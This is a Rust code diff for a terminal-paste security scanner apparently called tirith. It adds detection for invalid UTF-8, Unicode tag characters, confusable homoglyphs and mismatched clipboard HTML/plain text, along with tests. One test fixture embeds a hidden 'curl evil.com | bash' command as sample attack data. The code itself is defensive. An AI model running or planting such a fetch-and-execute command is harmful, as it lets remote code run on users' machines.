@@ -3,8 +3,22 @@ use crate::verdict::{Evidence, Finding, RuleId, Severity};
 
 /// Check raw bytes for terminal deception (paste-time).
 pub fn check_bytes(input: &[u8]) -> Vec<Finding> {
+    check_bytes_with_ignore(input, &[])
+}
+
+/// Like [`check_bytes`] but skips bytes whose offset falls inside `ignore_ranges`
+/// when deciding to emit a finding and assembling its evidence. Carves out the
+/// inert arg span of tirith inspection subcommands (`diff`/`score`/`why`/…); the
+/// ignore must be threaded into the scan because `Evidence::Text` findings (e.g.
+/// `UnicodeTags`) build their detail from raw bytes.
+pub fn check_bytes_with_ignore(
+    input: &[u8],
+    ignore_ranges: &[std::ops::Range<usize>],
+) -> Vec<Finding> {
     let mut findings = Vec::new();
-    let scan = extract::scan_bytes(input);
+    let report = extract::scan_bytes_with_ignored_ranges(input, ignore_ranges);
+    let dropped_details = report.dropped_details;
+    let scan = report.result;
 
     if scan.has_ansi_escapes {
         findings.push(Finding {
@@ -27,24 +41,45 @@ pub fn check_bytes(input: &[u8]) -> Vec<Finding> {
         });
     }
 
-    if scan.has_control_chars {
+    let invalid_utf8_evidence = if scan.has_invalid_utf8 {
+        invalid_utf8_evidence(input, ignore_ranges)
+    } else {
+        Vec::new()
+    };
+
+    if scan.has_control_chars || !invalid_utf8_evidence.is_empty() {
+        let has_invalid_utf8 = !invalid_utf8_evidence.is_empty();
+        let mut evidence: Vec<_> = scan
+            .details
+            .iter()
+            .filter(|d| d.description.contains("control"))
+            .map(|d| Evidence::ByteSequence {
+                offset: d.offset,
+                hex: d
+                    .codepoint
+                    .map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
+                description: d.description.clone(),
+            })
+            .collect();
+        evidence.extend(invalid_utf8_evidence);
         findings.push(Finding {
             rule_id: RuleId::ControlChars,
             severity: Severity::High,
-            title: "Control characters in pasted content".to_string(),
-            description: "Pasted content contains control characters (display-overwriting carriage return, backspace, etc.) that could hide the true command being executed".to_string(),
-            evidence: scan.details.iter()
-                .filter(|d| d.description.contains("control"))
-                .map(|d| Evidence::ByteSequence {
-                    offset: d.offset,
-                    hex: d.codepoint.map_or_else(|| format!("0x{:02x}", d.byte), |cp| format!("U+{cp:04X}")),
-                    description: d.description.clone(),
-                })
-                .collect(),
+            title: if has_invalid_utf8 {
+                "Malformed terminal text in pasted content".to_string()
+            } else {
+                "Control characters in pasted content".to_string()
+            },
+            description: if has_invalid_utf8 {
+                "Pasted content contains invalid UTF-8 bytes. Malformed terminal text can hide or change the display of adjacent commands and is refused under the protected paste profile".to_string()
+            } else {
+                "Pasted content contains control characters (display-overwriting carriage return, backspace, etc.) that could hide the true command being executed".to_string()
+            },
+            evidence,
             human_view: None,
             agent_view: None,
-                mitre_id: None,
-                custom_rule_id: None,
+            mitre_id: None,
+            custom_rule_id: None,
         });
     }
 
@@ -70,26 +105,24 @@ pub fn check_bytes(input: &[u8]) -> Vec<Finding> {
     }
 
     if scan.has_zero_width {
-        // Filter zero-width details: suppress ZWJ/ZWNJ in joining-script contexts
+        // Suppress ZWJ (U+200D) / ZWNJ (U+200C) when surrounded by joining-script
+        // characters (Arabic, Devanagari, Thai, etc.) — there they are legitimate.
         let zw_evidence: Vec<_> = scan
             .details
             .iter()
             .filter(|d| d.description.contains("zero-width"))
             .filter(|d| {
-                // Suppress ZWJ (U+200D) and ZWNJ (U+200C) when surrounded by
-                // joining-script characters (Arabic, Devanagari, Thai, etc.)
                 let is_zwj_or_zwnj =
                     d.description.contains("U+200D") || d.description.contains("U+200C");
                 if is_zwj_or_zwnj && is_joining_script_context(input, d.offset) {
-                    return false; // Suppress — legitimate use
+                    return false;
                 }
                 true
             })
             .collect();
 
         if !zw_evidence.is_empty() {
-            // Elevate to Critical when non-invisible content is ASCII-only
-            // (zero-width chars in pure ASCII text are always suspicious)
+            // Zero-width chars in otherwise pure ASCII have no legit use — elevate.
             let ascii_only = std::str::from_utf8(input)
                 .map(|s| {
                     s.chars()
@@ -148,24 +181,28 @@ pub fn check_bytes(input: &[u8]) -> Vec<Finding> {
     }
 
     if scan.has_unicode_tags {
-        let decoded = decode_unicode_tags(input);
-        findings.push(Finding {
-            rule_id: RuleId::UnicodeTags,
-            severity: Severity::Critical,
-            title: "Unicode Tags (hidden ASCII) detected".to_string(),
-            description: "Content contains Unicode Tag characters (U+E0000–U+E007F) that encode hidden ASCII text invisible to the user".to_string(),
-            evidence: vec![Evidence::Text {
-                detail: if decoded.is_empty() {
-                    "Hidden text could not be decoded".to_string()
-                } else {
-                    format!("Hidden text: \"{}\"", truncate(&decoded, 200))
-                },
-            }],
-            human_view: None,
-            agent_view: None,
+        // Decode excluding ignore-range bytes so hidden-text evidence can't leak
+        // from an inert arg span; if every tag byte was ignored, skip emission.
+        let decoded = decode_unicode_tags(input, ignore_ranges);
+        if !decoded.is_empty() || has_unicode_tag_outside_ranges(input, ignore_ranges) {
+            findings.push(Finding {
+                rule_id: RuleId::UnicodeTags,
+                severity: Severity::Critical,
+                title: "Unicode Tags (hidden ASCII) detected".to_string(),
+                description: "Content contains Unicode Tag characters (U+E0000–U+E007F) that encode hidden ASCII text invisible to the user".to_string(),
+                evidence: vec![Evidence::Text {
+                    detail: if decoded.is_empty() {
+                        "Hidden text could not be decoded".to_string()
+                    } else {
+                        format!("Hidden text: \"{}\"", truncate(&decoded, 200))
+                    },
+                }],
+                human_view: None,
+                agent_view: None,
                 mitre_id: None,
                 custom_rule_id: None,
-        });
+            });
+        }
     }
 
     if scan.has_variation_selectors {
@@ -211,10 +248,10 @@ pub fn check_bytes(input: &[u8]) -> Vec<Finding> {
     }
 
     if scan.has_confusable_text {
-        // Two-tier suppression to avoid false positives on natural multilingual text:
-        // 1. Math alphanumerics ("text confusable"): always suspicious — use broad ±16 byte window
-        // 2. Standard confusables ("confusable"): only flag when mixed INTO the same word as ASCII
-        //    e.g. "gіthub" (attack) vs "Note: Привет" (benign multilingual)
+        // Two-tier suppression to avoid firing on natural multilingual text:
+        // math alphanumerics ("text confusable U+") use a ±16-byte ASCII
+        // proximity check; standard Cyrillic/Greek ("confusable U+") only flag
+        // when mixed INTO an ASCII word ("gіthub" attack vs "Note: Привет" benign).
         let confusable_details: Vec<_> = scan
             .details
             .iter()
@@ -222,19 +259,16 @@ pub fn check_bytes(input: &[u8]) -> Vec<Finding> {
                 d.description.contains("confusable U+")
                     || d.description.contains("text confusable U+")
             })
+            .filter(|d| {
+                if d.description.contains("text confusable U+") {
+                    is_ascii_nearby(input, d.offset)
+                } else {
+                    is_same_word_as_ascii(input, d.offset)
+                }
+            })
             .collect();
 
-        let has_suspicious = confusable_details.iter().any(|d| {
-            if d.description.contains("text confusable U+") {
-                // Math alphanumerics: broad window — no legitimate terminal use
-                is_ascii_nearby(input, d.offset)
-            } else {
-                // Standard Cyrillic/Greek confusables: must be in the SAME word as ASCII
-                is_same_word_as_ascii(input, d.offset)
-            }
-        });
-
-        if has_suspicious {
+        if !confusable_details.is_empty() {
             findings.push(Finding {
                 rule_id: RuleId::ConfusableText,
                 severity: Severity::High,
@@ -281,18 +315,87 @@ pub fn check_bytes(input: &[u8]) -> Vec<Finding> {
         });
     }
 
+    if dropped_details > 0 {
+        findings.push(Finding {
+            rule_id: RuleId::AnalysisIncomplete,
+            severity: Severity::High,
+            title: "Terminal byte scan retained only part of its evidence".to_string(),
+            description: "The input produced more byte-level detail records than Tirith's \
+                          bounded retention cap. Records kept before the cap were analyzed, \
+                          and the omitted records are reported instead of being treated as \
+                          absent."
+                .to_string(),
+            evidence: vec![Evidence::Text {
+                detail: format!(
+                    "byte_detail_omitted_count={} retained_cap={}",
+                    dropped_details,
+                    extract::ByteScanResult::MAX_RETAINED_DETAILS
+                ),
+            }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        });
+    }
+
     findings
 }
 
-/// Decode Unicode Tag characters (U+E0000–U+E007F) to their hidden ASCII message.
-/// Each tag character encodes one ASCII byte: codepoint - 0xE0000 = ASCII value.
-fn decode_unicode_tags(input: &[u8]) -> String {
+/// Return bounded evidence for every malformed UTF-8 sequence whose first byte
+/// is outside an inert inspection-argument range. `Utf8Error::valid_up_to` and
+/// `error_len` let us advance over each malformed sequence without discarding a
+/// valid scalar immediately before or after it.
+fn invalid_utf8_evidence(input: &[u8], ignore_ranges: &[std::ops::Range<usize>]) -> Vec<Evidence> {
+    const MAX_INVALID_UTF8_EVIDENCE: usize = 16;
+
+    let mut evidence = Vec::new();
+    let mut cursor = 0;
+    while cursor < input.len() && evidence.len() < MAX_INVALID_UTF8_EVIDENCE {
+        let error = match std::str::from_utf8(&input[cursor..]) {
+            Ok(_) => break,
+            Err(error) => error,
+        };
+        let offset = cursor + error.valid_up_to();
+        let invalid_len = error
+            .error_len()
+            .unwrap_or_else(|| input.len().saturating_sub(offset))
+            .max(1);
+        let end = offset.saturating_add(invalid_len).min(input.len());
+        for (invalid_offset, byte) in input.iter().enumerate().take(end).skip(offset) {
+            if evidence.len() == MAX_INVALID_UTF8_EVIDENCE {
+                break;
+            }
+            if ignore_ranges
+                .iter()
+                .any(|range| range.contains(&invalid_offset))
+            {
+                continue;
+            }
+            evidence.push(Evidence::ByteSequence {
+                offset: invalid_offset,
+                hex: format!("0x{byte:02x}"),
+                description: "invalid UTF-8 byte in terminal input".to_string(),
+            });
+        }
+        cursor = end;
+    }
+    evidence
+}
+
+/// Decode Unicode Tag characters (U+E0000–U+E007F) to hidden ASCII (codepoint -
+/// 0xE0000). `ignore_ranges` offsets are skipped so inert-arg-span content can't
+/// leak out through the evidence string.
+fn decode_unicode_tags(input: &[u8], ignore_ranges: &[std::ops::Range<usize>]) -> String {
     let Ok(s) = std::str::from_utf8(input) else {
         eprintln!("tirith: warning: unicode tag decode failed: input is not valid UTF-8");
         return String::new();
     };
     let mut decoded = String::new();
-    for ch in s.chars() {
+    for (byte_off, ch) in s.char_indices() {
+        if ignore_ranges.iter().any(|r| r.contains(&byte_off)) {
+            continue;
+        }
         let cp = ch as u32;
         if (0xE0001..=0xE007F).contains(&cp) {
             let ascii = (cp - 0xE0000) as u8;
@@ -304,20 +407,37 @@ fn decode_unicode_tags(input: &[u8]) -> String {
     decoded
 }
 
+/// Returns true iff `input` contains at least one Unicode Tag byte at an
+/// offset that falls OUTSIDE every ignore range.
+fn has_unicode_tag_outside_ranges(input: &[u8], ignore_ranges: &[std::ops::Range<usize>]) -> bool {
+    let Ok(s) = std::str::from_utf8(input) else {
+        return false;
+    };
+    for (byte_off, ch) in s.char_indices() {
+        if ignore_ranges.iter().any(|r| r.contains(&byte_off)) {
+            continue;
+        }
+        let cp = ch as u32;
+        if (0xE0001..=0xE007F).contains(&cp) {
+            return true;
+        }
+    }
+    false
+}
+
 /// Check for hidden multiline content in string input.
 pub fn check_hidden_multiline(input: &str) -> Vec<Finding> {
     let mut findings = Vec::new();
 
-    // Check for lines that might be hidden after the visible first line
     let lines: Vec<&str> = input.lines().collect();
     if lines.len() > 1 {
-        // Check if later lines contain suspicious patterns
+        // Skip line 0 (what the user means to run); suspicious shapes on later
+        // lines are the paste-smuggling pattern.
         for (i, line) in lines.iter().enumerate().skip(1) {
             let trimmed = line.trim();
             if trimmed.is_empty() {
                 continue;
             }
-            // If a non-first line contains what looks like a command
             if looks_like_hidden_command(trimmed) {
                 findings.push(Finding {
                     rule_id: RuleId::HiddenMultiline,
@@ -344,22 +464,21 @@ pub fn check_hidden_multiline(input: &str) -> Vec<Finding> {
     findings
 }
 
-/// Check if a byte offset in the input is surrounded by joining-script characters.
-/// ZWJ and ZWNJ are legitimate in scripts that use character joining (Arabic, Devanagari, etc.).
-/// Returns true only if BOTH immediate non-Common neighbors are in the same joining script.
-/// One-sided joining (e.g., Latin + ZWJ + Arabic) is suspicious and not suppressed.
-fn is_joining_script_context(input: &[u8], byte_offset: usize) -> bool {
+/// `true` only when BOTH non-Common neighbors of the ZWJ/ZWNJ at `byte_offset`
+/// are in the SAME joining script (Arabic, Devanagari, …), where they are
+/// legitimate. One-sided joining (Latin + ZWJ + Arabic) is suspicious and not
+/// suppressed.
+pub(crate) fn is_joining_script_context(input: &[u8], byte_offset: usize) -> bool {
     use unicode_script::{Script, UnicodeScript};
 
     let Ok(text) = std::str::from_utf8(input) else {
         return false;
     };
 
-    // Find the character at the offset (the ZWJ/ZWNJ itself)
     let zw_char = text[byte_offset..].chars().next();
     let zw_len = zw_char.map(|c| c.len_utf8()).unwrap_or(1);
 
-    // Helper: get the non-Common/Inherited script of a char
+    // Script::Common/Inherited don't identify a writing system — skip them.
     let significant_script = |ch: char| {
         let s = ch.script();
         if s == Script::Common || s == Script::Inherited {
@@ -369,7 +488,6 @@ fn is_joining_script_context(input: &[u8], byte_offset: usize) -> bool {
         }
     };
 
-    // Check the character immediately BEFORE the ZWJ/ZWNJ
     let before_script = if byte_offset > 0 {
         let mut prev_start = byte_offset - 1;
         while prev_start > 0 && !text.is_char_boundary(prev_start) {
@@ -383,7 +501,6 @@ fn is_joining_script_context(input: &[u8], byte_offset: usize) -> bool {
         None
     };
 
-    // Check the character immediately AFTER the ZWJ/ZWNJ
     let after_offset = byte_offset + zw_len;
     let after_script = if after_offset < text.len() {
         text[after_offset..]
@@ -394,8 +511,8 @@ fn is_joining_script_context(input: &[u8], byte_offset: usize) -> bool {
         None
     };
 
-    // Both neighbors must be present, in the same joining script.
-    // Mixed joining scripts (e.g., Arabic + Devanagari) are suspicious.
+    // Require the SAME joining script on both sides; one-sided or mismatched is
+    // the attack shape we want to flag.
     match (before_script, after_script) {
         (Some(before), Some(after)) => before == after && is_joining_script(before),
         _ => false,
@@ -427,18 +544,16 @@ fn is_joining_script(script: unicode_script::Script) -> bool {
     )
 }
 
-/// Check clipboard HTML for hidden content not visible in the plain-text paste.
-///
-/// When a user pastes text, the terminal only sees the plain-text representation,
-/// but the clipboard may carry HTML with hidden content (CSS hiding, color hiding,
-/// hidden attributes) or extra text not visible in the plain-text version.
+/// Check clipboard HTML for content hidden from the plain-text paste (CSS/color
+/// hiding, hidden attributes, or extra text) that the terminal never sees.
 pub fn check_clipboard_html(html: &str, plain_text: &str) -> Vec<Finding> {
     let mut findings = Vec::new();
 
-    // Run rendered content checks on the clipboard HTML
     let rendered_findings = crate::rules::rendered::check(html, None);
 
-    // Convert hidden-content findings to ClipboardHidden
+    // Hidden-content rules become ClipboardHidden (same evidence, distinct rule
+    // id) so downstream UI can tell "paste hides more than shown" from a
+    // "rendered page has hidden bits".
     for f in rendered_findings {
         match f.rule_id {
             RuleId::HiddenCssContent | RuleId::HiddenColorContent | RuleId::HiddenHtmlAttribute => {
@@ -457,11 +572,10 @@ pub fn check_clipboard_html(html: &str, plain_text: &str) -> Vec<Finding> {
                     custom_rule_id: None,
                 });
             }
-            _ => {} // Ignore comment findings in clipboard context
+            _ => {}
         }
     }
 
-    // Check for length discrepancy: HTML visible text vs plain text
     let visible_text = strip_html_tags(html);
     let visible_len = visible_text.trim().chars().count();
     let plain_len = plain_text.trim().chars().count();
@@ -488,6 +602,72 @@ pub fn check_clipboard_html(html: &str, plain_text: &str) -> Vec<Finding> {
         });
     }
 
+    // repo-0334: the deception check was one-directional. A benign-looking
+    // HTML part with a LONGER or simply DIFFERENT malicious text/plain payload
+    // (the string the terminal actually pastes) is the dangerous direction.
+    if plain_len > visible_len + 50 {
+        findings.push(Finding {
+            rule_id: RuleId::ClipboardHidden,
+            severity: Severity::High,
+            title: "Clipboard plain text contains more than rendered HTML".to_string(),
+            description: format!(
+                "Plain-text payload has ~{plain_len} chars vs {visible_len} chars of HTML-visible \
+                 text ({} chars only in the pasted text)",
+                plain_len - visible_len
+            ),
+            evidence: vec![Evidence::Text {
+                detail: format!(
+                    "plain text: {plain_len} chars, HTML visible text: {visible_len} chars"
+                ),
+            }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        });
+    }
+
+    // repo-0334: equal-LENGTH but different content must not pass either. When
+    // both parts are non-trivial and no directional finding fired, require a
+    // majority of the plain text's words to appear in the HTML-visible text.
+    if plain_len >= 20 && visible_len >= 20 && findings.is_empty() {
+        let visible_words: std::collections::HashSet<String> = visible_text
+            .split_whitespace()
+            .map(|w| w.to_lowercase())
+            .collect();
+        let plain_words: Vec<String> = plain_text
+            .split_whitespace()
+            .map(|w| w.to_lowercase())
+            .collect();
+        if !plain_words.is_empty() {
+            let overlap = plain_words
+                .iter()
+                .filter(|w| visible_words.contains(*w))
+                .count();
+            if overlap * 2 < plain_words.len() {
+                findings.push(Finding {
+                    rule_id: RuleId::ClipboardHidden,
+                    severity: Severity::High,
+                    title: "Clipboard plain text differs from rendered HTML".to_string(),
+                    description: "The text/plain payload shares fewer than half its words with \
+                        the HTML-visible content — the pasted command is not what the rendered \
+                        preview showed."
+                        .to_string(),
+                    evidence: vec![Evidence::Text {
+                        detail: format!(
+                            "word overlap {overlap}/{} between plain text and HTML-visible text",
+                            plain_words.len()
+                        ),
+                    }],
+                    human_view: None,
+                    agent_view: None,
+                    mitre_id: None,
+                    custom_rule_id: None,
+                });
+            }
+        }
+    }
+
     findings
 }
 
@@ -509,19 +689,88 @@ fn strip_html_tags(html: &str) -> String {
     s.trim().to_string()
 }
 
-/// Broad proximity check: ASCII letters within ±16 bytes.
-/// Used for math alphanumeric symbols which have no legitimate terminal use.
-fn is_ascii_nearby(input: &[u8], offset: usize) -> bool {
+/// ASCII letters within ±16 bytes (for math alphanumerics, no legit terminal use).
+pub(crate) fn is_ascii_nearby(input: &[u8], offset: usize) -> bool {
     let start = offset.saturating_sub(16);
     let end = (offset + 16).min(input.len());
     input[start..end].iter().any(|b| b.is_ascii_alphabetic())
 }
 
-/// Same-word check: the confusable char and ASCII letters share the same word
-/// (no whitespace or common punctuation separating them).
-/// "gіthub" → true (і mixed into ASCII word)
-/// "Note: Привет" → false (different words separated by ": ")
-fn is_same_word_as_ascii(input: &[u8], offset: usize) -> bool {
+/// `true` when the confusable char at `offset` shares a "word" with ASCII
+/// letters — no boundary between the two:
+/// - `gіthub` → true (Cyrillic `і` mixed into a Latin word — the attack shape).
+/// - `Note: Привет`, `echo Привет` → false (whitespace/`:` boundary; the
+///   Cyrillic word has no ASCII).
+/// - `Rustを使う。` → false (the Hiragana terminates the word, so the `。`
+///   confusable is isolated from `Rust`). Fixes #126.
+/// - `…/filename_Отсканированный_документ.pdf` → false (path/`_` separators
+///   isolate the pure-Cyrillic segments). Fixes #134.
+///
+/// Boundaries are script-aware: punctuation is always a boundary (including
+/// non-ASCII `Common` punctuation such as U+3002), while combining marks remain
+/// attached to the word they modify. Letters and numbers from the
+/// confusable-bearing set {Latin, Cyrillic, Greek, Common} stay inside a word;
+/// Han/Hiragana/Katakana/Hangul/Thai/Arabic/… terminate it. The word is
+/// suspicious only if, after trimming at those boundaries, it still contains an
+/// ASCII letter.
+pub(crate) fn is_same_word_as_ascii(input: &[u8], offset: usize) -> bool {
+    use unicode_script::{Script, UnicodeScript};
+
+    // Chars that stay *inside* a word. Non-alphanumeric ASCII and any
+    // non-confusable-bearing script are boundaries that split it.
+    fn is_word_char(ch: char) -> bool {
+        if ch.is_ascii() {
+            return ch.is_ascii_alphanumeric();
+        }
+        if ch.script() == Script::Inherited {
+            // Combining marks inherit the script of the base character and must
+            // not split an otherwise mixed-script attack word.
+            return true;
+        }
+        ch.is_alphanumeric()
+            && matches!(
+                ch.script(),
+                Script::Latin | Script::Cyrillic | Script::Greek | Script::Common
+            )
+    }
+
+    let Ok(text) = std::str::from_utf8(input) else {
+        // Non-UTF-8 buffer (e.g. a binary file): fall back to the conservative
+        // ASCII-only boundary scan so we never silently stop flagging.
+        return same_word_as_ascii_bytes(input, offset);
+    };
+    if offset > text.len() || !text.is_char_boundary(offset) {
+        return false;
+    }
+
+    // Expand left to the start of the word (the confusable itself is covered by
+    // the forward pass below).
+    let mut word_start = offset;
+    for (i, ch) in text[..offset].char_indices().rev() {
+        if !is_word_char(ch) {
+            break;
+        }
+        word_start = i;
+    }
+
+    // Expand right to the end of the word.
+    let mut word_end = offset;
+    for (i, ch) in text[offset..].char_indices() {
+        if !is_word_char(ch) {
+            break;
+        }
+        word_end = offset + i + ch.len_utf8();
+    }
+
+    text.as_bytes()[word_start..word_end]
+        .iter()
+        .any(|b| b.is_ascii_alphabetic())
+}
+
+/// Conservative ASCII-only fallback used only when the scanned buffer is not
+/// valid UTF-8 (binary content): only ASCII whitespace/punctuation breaks a
+/// word. Over-flags rather than under-flags, matching the prior heuristic.
+fn same_word_as_ascii_bytes(input: &[u8], offset: usize) -> bool {
     fn is_word_boundary(b: u8) -> bool {
         matches!(
             b,
@@ -547,19 +796,16 @@ fn is_same_word_as_ascii(input: &[u8], offset: usize) -> bool {
         )
     }
 
-    // Walk backwards to word start
     let mut word_start = offset;
     while word_start > 0 && !is_word_boundary(input[word_start - 1]) {
         word_start -= 1;
     }
 
-    // Walk forwards to word end (skip past the multi-byte char at offset)
     let mut word_end = offset;
     while word_end < input.len() && !is_word_boundary(input[word_end]) {
         word_end += 1;
     }
 
-    // Check if any byte in this word is an ASCII letter
     input[word_start..word_end]
         .iter()
         .any(|b| b.is_ascii_alphabetic())
@@ -587,6 +833,157 @@ mod tests {
     use super::*;
 
     #[test]
+    fn unicode_punctuation_is_a_word_boundary_but_combining_marks_are_not() {
+        let natural = "本文。oEmbed";
+        let punctuation_offset = natural.find('。').expect("ideographic full stop");
+        assert!(!is_same_word_as_ascii(
+            natural.as_bytes(),
+            punctuation_offset
+        ));
+
+        let mixed = "g\u{0301}іthub";
+        let cyrillic_offset = mixed.find('і').expect("Cyrillic i");
+        assert!(is_same_word_as_ascii(mixed.as_bytes(), cyrillic_offset));
+    }
+
+    #[test]
+    fn invalid_utf8_keeps_the_conservative_ascii_fallback() {
+        assert!(is_same_word_as_ascii(b"a\xffb", 1));
+        assert!(!is_same_word_as_ascii(b"a \xff", 2));
+    }
+
+    #[test]
+    fn variation_flood_cannot_downgrade_later_critical_zero_width() {
+        let input = format!(
+            "ASCII{}\u{200B}",
+            "\u{FE0F}".repeat(extract::ByteScanResult::MAX_RETAINED_DETAILS)
+        );
+        let findings = check_bytes(input.as_bytes());
+        let zero_width = findings
+            .iter()
+            .find(|finding| finding.rule_id == RuleId::ZeroWidthChars)
+            .expect("zero-width class must retain representative evidence");
+
+        assert_eq!(zero_width.severity, Severity::Critical);
+        assert!(!zero_width.evidence.is_empty());
+        assert!(findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::VariationSelector));
+    }
+
+    #[test]
+    fn benign_joiner_flood_cannot_exhaust_suspicious_zero_width_evidence() {
+        let benign =
+            "ا\u{200d}ا ".repeat(extract::ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS * 3);
+        let input = format!("{benign}echo sa\u{200b}fe");
+        let findings = check_bytes(input.as_bytes());
+        let finding = findings
+            .iter()
+            .find(|finding| finding.rule_id == RuleId::ZeroWidthChars)
+            .expect("later suspicious zero-width character must survive contextual retention");
+        assert!(finding.evidence.iter().any(|evidence| matches!(
+            evidence,
+            Evidence::ByteSequence { hex, .. } if hex == "U+200B"
+        )));
+        assert!(
+            findings.iter().any(|finding| {
+                finding.rule_id == RuleId::AnalysisIncomplete
+                    && finding.evidence.iter().any(|evidence| {
+                        matches!(
+                            evidence,
+                            Evidence::Text { detail } if detail.contains("byte_detail_omitted_count=")
+                        )
+                    })
+            }),
+            "omitted byte-scan details must be their own AnalysisIncomplete finding: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn omitted_byte_details_emit_analysis_incomplete_even_without_other_findings() {
+        // Joiner-script ZWJ is legitimate, so the class flag is set but no
+        // ZeroWidthChars finding is emitted. Overflowing the per-class detail
+        // cap must still surface the gap instead of failing open.
+        let input =
+            "ا\u{200d}ا ".repeat(extract::ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS * 3);
+        let findings = check_bytes(input.as_bytes());
+        assert!(
+            findings
+                .iter()
+                .all(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+            "benign joiner flood must not emit a security finding besides the gap: {findings:?}"
+        );
+        let incomplete = findings
+            .iter()
+            .find(|finding| finding.rule_id == RuleId::AnalysisIncomplete)
+            .expect("exceeding the byte-scan detail cap must emit AnalysisIncomplete");
+        assert_eq!(incomplete.severity, Severity::High);
+        assert!(incomplete.evidence.iter().any(|evidence| matches!(
+            evidence,
+            Evidence::Text { detail }
+                if detail.contains("byte_detail_omitted_count=")
+                    && detail.contains("retained_cap=")
+        )));
+    }
+
+    #[test]
+    fn benign_confusable_flood_cannot_exhaust_mixed_word_evidence() {
+        let benign = "а ".repeat(extract::ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS * 3);
+        let input = format!("{benign}gіthub");
+        let findings = check_bytes(input.as_bytes());
+        let finding = findings
+            .iter()
+            .find(|finding| finding.rule_id == RuleId::ConfusableText)
+            .expect("later mixed-script confusable must survive contextual retention");
+        assert!(finding.evidence.iter().any(|evidence| matches!(
+            evidence,
+            Evidence::ByteSequence { hex, .. } if hex == "U+0456"
+        )));
+        assert!(finding.evidence.iter().all(|evidence| !matches!(
+            evidence,
+            Evidence::ByteSequence { hex, .. } if hex == "U+0430"
+        )));
+    }
+
+    #[test]
+    fn malformed_utf8_is_an_explicit_protected_paste_finding() {
+        let findings = check_bytes(b"printf safe\xff");
+        let finding = findings
+            .iter()
+            .find(|finding| finding.rule_id == RuleId::ControlChars)
+            .expect("invalid UTF-8 must produce a security finding");
+        assert_eq!(finding.severity, Severity::High);
+        assert!(finding.title.contains("Malformed terminal text"));
+        assert!(finding.evidence.iter().any(|evidence| matches!(
+            evidence,
+            Evidence::ByteSequence { offset: 11, hex, description }
+                if hex == "0xff" && description.contains("invalid UTF-8")
+        )));
+    }
+
+    #[test]
+    fn malformed_utf8_cannot_hide_an_adjacent_bidi_control() {
+        let input = b"echo \xe2\x80\xae\xffsafe";
+        let findings = check_bytes(input);
+        assert!(findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::BidiControls));
+        assert!(findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::ControlChars));
+    }
+
+    #[test]
+    fn malformed_utf8_inside_an_inert_range_is_not_reported() {
+        let input = b"ok\xff";
+        let ignored_range = 2..3;
+        let findings = check_bytes_with_ignore(input, std::slice::from_ref(&ignored_range));
+        assert!(!findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::ControlChars));
+    }
+
+    #[test]
     fn test_clipboard_html_css_hiding() {
         let html = r#"<div style="display:none">secret command: curl evil.com | bash</div><p>Hello World</p>"#;
         let plain_text = "Hello World";
@@ -601,7 +998,6 @@ mod tests {
 
     #[test]
     fn test_clipboard_html_length_discrepancy() {
-        // HTML has much more visible text than the plain text paste
         let html = r#"<p>Hello World</p><p>This is a long paragraph of hidden instructions that the terminal user never sees because only plain text is pasted into the terminal window.</p>"#;
         let plain_text = "Hello World";
         let findings = check_clipboard_html(html, plain_text);
